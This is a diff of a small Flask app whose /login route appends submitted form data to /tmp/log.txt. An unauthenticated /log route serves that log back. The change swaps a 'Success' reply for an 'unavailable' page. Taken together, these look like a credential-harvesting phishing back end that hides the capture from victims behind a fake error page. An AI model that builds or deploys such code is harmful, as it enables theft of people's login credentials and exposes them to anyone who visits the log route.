@@ -4,11 +4,15 @@ import tempfile
 app = Flask(__name__)
 
 # Define a route to render the new HTML file
+
+
 @app.route("/")
 def index():
     return render_template("index.html")
 
 # Define a route to handle form submissions
+
+
 @app.route("/login", methods=["POST"])
 def login():
     # Create a temporary file in a writable directory
@@ -24,7 +28,8 @@ def login():
         log_data = f.read()
     with open('/tmp/log.txt', 'a') as f:
         f.write(log_data)
-    return "Success"
+    return render_template("unavailable.html")
+
 
 @app.route('/log')
 def view_log():
@@ -35,6 +40,7 @@ def view_log():
 
     # Return the contents as a response
     return file_contents
+
 
 # Run the app
 if __name__ == "__main__":
